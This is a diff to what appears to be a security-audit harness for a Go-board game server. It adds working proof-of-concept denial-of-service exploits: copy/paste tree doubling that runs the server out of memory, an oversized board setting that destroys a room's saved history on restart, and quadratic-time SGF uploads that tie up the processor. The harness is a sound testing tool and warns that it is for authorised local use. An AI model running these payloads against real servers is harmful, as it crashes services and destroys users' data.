@@ -25,6 +25,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"runtime"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -1231,6 +1232,147 @@ func pocA1() {
 	fmt.Println(">> In the OGS goroutine this panic is UNRECOVERED -> the whole server crashes.")
 }
 
+// P2-1a: copy/paste exponential state amplification -> OOM (whole-server crash).
+// CONFIRMED: `copy` sets clipboard = current.Copy() (a deep copy of the WHOLE
+// subtree under current); `clipboard` (paste) appends a fresh Copy() of the
+// clipboard as a new child of current (edit.go:398-433). Neither command
+// advances `current`, so with current pinned at the root, every copy captures
+// the entire tree and every paste doubles it: N -> 2N. k alternating events =>
+// 2^k nodes. Both types fall through to the "_" default handler
+// chain(handleEvent, outsideBuffer, authorized, broadcastAfter, setTimeAfter):
+// outsideBuffer does NOT throttle a single user's consecutive events
+// (setTimeAfter seeds lastUser=attacker after the first, so the buffer check is
+// skipped thereafter) and authorized is a no-op on an open (default) room. So an
+// unauthenticated client can drive the tree to a multi-GB Go heap -> fatal OOM.
+// A heap OOM is NOT recovered by net/http's per-request recover() -> the whole
+// server dies. Demonstrated here through the real room handler chain.
+func pocCopyBomb() {
+	banner("copybomb", "copy/paste exponential state amplification -> OOM (whole-server crash)")
+	const cycles = 18             // 2^18 = 262144 nodes (~130 MiB) — safe locally; each +1 doubles it
+	r := room.NewRoom("copybomb") // open room, no password (the default posture)
+	attacker := "unauth-attacker"
+
+	// Faithful to the wire: a single attacker's consecutive events bypass
+	// outsideBuffer. The first event only needs to arrive >inputBuffer (250ms)
+	// after the last room activity — trivially true for an attacker who waits a
+	// beat. Model that by ageing lastActive; thereafter setTimeAfter pins
+	// lastUser=attacker and every following event skips the buffer check.
+	past := time.Now().Add(-time.Second)
+	r.SetLastActive(&past)
+
+	send := func(typ string) {
+		e := evpkg.NewEvent(typ, nil)
+		e.SetUser(attacker)
+		r.HandleAny(e) // chain(handleEvent, outsideBuffer, authorized, broadcastAfter, setTimeAfter)
+	}
+
+	fmt.Printf("driving %d unauthenticated copy/clipboard cycles on an OPEN room via the real handler chain:\n", cycles)
+	fmt.Printf("  %-6s %-14s %s\n", "cycle", "nodes", "live heap")
+	for i := 1; i <= cycles; i++ {
+		send("copy")      // clipboard = current.Copy()  (captures the WHOLE tree; current stays at root)
+		send("clipboard") // paste: current.Down = append(..., clipboard.Copy())  -> node count doubles
+		if i <= 4 || i%2 == 0 || i == cycles {
+			fmt.Printf("  %-6d %-14d %d MiB\n", i, nodeCount(r), heapMiB())
+		}
+	}
+	n := nodeCount(r)
+	if n < (1 << cycles) {
+		fmt.Printf(">> node count %d < 2^%d — outsideBuffer/authorized BLOCKED the events (unexpected)\n", n, cycles)
+		return
+	}
+	fmt.Printf(">> CONFIRMED exponential doubling: %d cycles -> %d nodes (2^%d). `current` never advances,\n", cycles, n, cycles)
+	fmt.Println(">> so each copy captures the whole tree and each paste doubles it (N -> 2N).")
+	fmt.Println(">> ~28 alternating {\"event\":\"copy\"} / {\"event\":\"clipboard\"} events -> 2^28 ~= 2.7e8 nodes")
+	fmt.Println(">> -> multi-GB Go heap -> fatal OOM. A heap OOM is NOT recovered by net/http (whole-server crash).")
+	fmt.Println(">> outsideBuffer is not a mitigation: it only throttles DIFFERENT users interleaving; a single")
+	fmt.Println(">> attacker's consecutive events bypass it (setTimeAfter pins lastUser=attacker after the first).")
+}
+
+// heapMiB returns the current live heap (post-GC) in MiB.
+func heapMiB() uint64 {
+	runtime.GC()
+	var m runtime.MemStats
+	runtime.ReadMemStats(&m)
+	return m.HeapAlloc / (1 << 20)
+}
+
+// P2-3a: update_settings with a board size >19 -> the room is silently DROPPED on
+// the next restart (unauthenticated persistent data loss). handleUpdateSettings
+// (handlers.go:294) reads `size` with no bounds check and, when it differs from
+// the current size, does SetState(NewState(size)). NewState does NOT clamp, so a
+// 20x20 board is built (size 20 costs trivial memory — this is NOT C-3's huge-size
+// OOM) and persisted as SZ[20]. On restart Hub.Load -> room.Load -> state.FromSGF
+// REJECTS size>19 ("unsupported board size"), so Hub.Load logs "failed to load
+// room" and skips it (hub.go:172-175): the room's entire persisted history is
+// destroyed. `authorized` is a no-op on an open (default) room, so it is
+// unauthenticated. Demonstrated locally through the real handler + reload paths.
+func pocSizePoison() {
+	banner("sizepoison", "update_settings size>19 -> room silently dropped on restart (persistent data loss)")
+	r := room.NewRoom("sizepoison") // open (default) room, no password -> authorized is a no-op
+	fmt.Printf("default board size: %d\n", r.Size())
+
+	// unauthenticated update_settings with size 20 (no bounds check, trivial RAM)
+	e := evpkg.NewEvent("update_settings", map[string]any{
+		"buffer": float64(250), "size": float64(20), "nickname": "x",
+		"black": "", "white": "", "komi": "", "password": "",
+	})
+	e.SetUser("unauth-attacker")
+	r.HandleAny(e)
+	fmt.Printf("board size after unauthenticated update_settings: %d\n", r.Size())
+
+	sgf := r.GetState().ToSGF() // exactly what Hub.Save persists
+	fmt.Printf("persisted SGF: %s\n", sgf)
+
+	// simulate the restart reload: Hub.Load -> room.Load -> state.FromSGF
+	if _, err := state.FromSGF(sgf); err != nil {
+		fmt.Printf(">> CONFIRMED: on restart state.FromSGF rejects the persisted board: %v\n", err)
+		fmt.Println(">> room.Load returns this error; Hub.Load logs \"failed to load room\" and SKIPS it (hub.go:172).")
+		fmt.Println(">> The room's whole persisted state is destroyed -> unauthenticated persistent data loss,")
+		fmt.Println(">> at trivial memory cost (size 20 is not C-3's OOM; the damage is the failed reload).")
+	} else {
+		fmt.Println("reload succeeded (unexpected)")
+	}
+}
+
+// P2-5a: FromSGF is O(N^2). computeDiffSetup (util.go:119) calls gotoIndex
+// (nav.go:52) for EVERY setup node, and gotoIndex rewinds to the root and walks
+// forward one node at a time -> O(depth) per node, O(N^2) for a linear chain. A
+// single unauthenticated upload_sgf of N empty `;` nodes (~N bytes, well under the
+// 1MB cap) pins a CPU core for O(N^2); a few parallel uploads pin every core
+// (request-path CPU exhaustion). The same rewind-walk makes paste/reindex
+// superlinear too. Measured here across doubling N.
+func pocSGFQuad() {
+	banner("sgfquad", "FromSGF O(N^2) via gotoIndex rewind-walk -> single-upload CPU DoS")
+	fmt.Printf("  %-7s %-9s %-11s %s\n", "nodes", "bytes", "FromSGF", "scaling")
+	var prev time.Duration
+	for _, n := range []int{1000, 2000, 4000, 8000} {
+		var b strings.Builder
+		b.WriteString("(;GM[1]FF[4]SZ[19]")
+		for i := 0; i < n; i++ {
+			b.WriteByte(';') // one empty setup node each -> a linear chain
+		}
+		b.WriteByte(')')
+		sgf := b.String()
+
+		t0 := time.Now()
+		_, err := state.FromSGF(sgf)
+		d := time.Since(t0)
+
+		scal := ""
+		if prev > 0 {
+			scal = fmt.Sprintf("x%.1f for 2x nodes", float64(d)/float64(prev))
+		}
+		prev = d
+		if err != nil {
+			fmt.Printf("  %-7d %-9d err: %v\n", n, len(sgf), err)
+			continue
+		}
+		fmt.Printf("  %-7d %-9d %-11v %s\n", n, len(sgf), d.Round(time.Millisecond), scal)
+	}
+	fmt.Println(">> ~4x time per 2x nodes = O(N^2). A ~20000-node SGF is ~20 KB (under the 1MB upload_sgf cap)")
+	fmt.Println(">> and pins one core ~1 minute; a few parallel uploads pin every core. Unauthenticated on any open room.")
+}
+
 // =========================================================================
 
 func roomCount() int { return statField("rooms") }
@@ -1281,6 +1423,9 @@ var pocs = []struct {
 	{"b1", "[pass2] Colon-less LB label poison-pill — unrecoverable board (CONFIRMED)", pocB1},
 	{"b2", "[fuzz] Empty TR/SQ mark poison-pill — nil-deref in GenerateFullFrame (CONFIRMED)", pocB2},
 	{"a1", "[pass2] Board.Set nil/OOB via OGS goroutine — whole-server crash (CONFIRMED)", pocA1},
+	{"copybomb", "[Critical 1a] copy/paste exponential state amplification -> OOM (CONFIRMED)", pocCopyBomb},
+	{"sizepoison", "[Medium 3a] update_settings size>19 -> room dropped on restart (CONFIRMED)", pocSizePoison},
+	{"sgfquad", "[Medium 5a] FromSGF O(N^2) -> single-upload CPU DoS (CONFIRMED)", pocSGFQuad},
 	{"m2", "[medium] Unbounded HTTP request body", pocM2},
 	{"m3", "[medium] /debug leaks room state unauthenticated (CONFIRMED)", pocM3},
 	{"m4", "[medium] SSRF: fetch follows redirects, no timeout (CONFIRMED)", pocM4},
@@ -1310,7 +1455,7 @@ func usage() {
 	for _, p := range pocs {
 		fmt.Printf("  %-4s %s\n", p.id, p.title)
 	}
-	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7 a1 b1 b2 m4 m7 dl2 cs2 graft grow gl1 dl1 az1 az2 cs1 nick authleak sgfesc id1  (h6 verifies a mitigation)")
+	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7 a1 b1 b2 copybomb sizepoison sgfquad m4 m7 dl2 cs2 graft grow gl1 dl1 az1 az2 cs1 nick authleak sgfesc id1  (h6 verifies a mitigation)")
 	fmt.Println("need -target (live disposable instance): c1 c3 c4 c7 h1 h2 h3 h4 h5 m2 m3 m5 dr1 id3")
 	fmt.Println("b1 also runs e2e when -target is given (uploads the poison, then you join to brick it)")
 	fmt.Println("\nWARNING: several PoCs crash or exhaust the target. Authorised local testing only.")
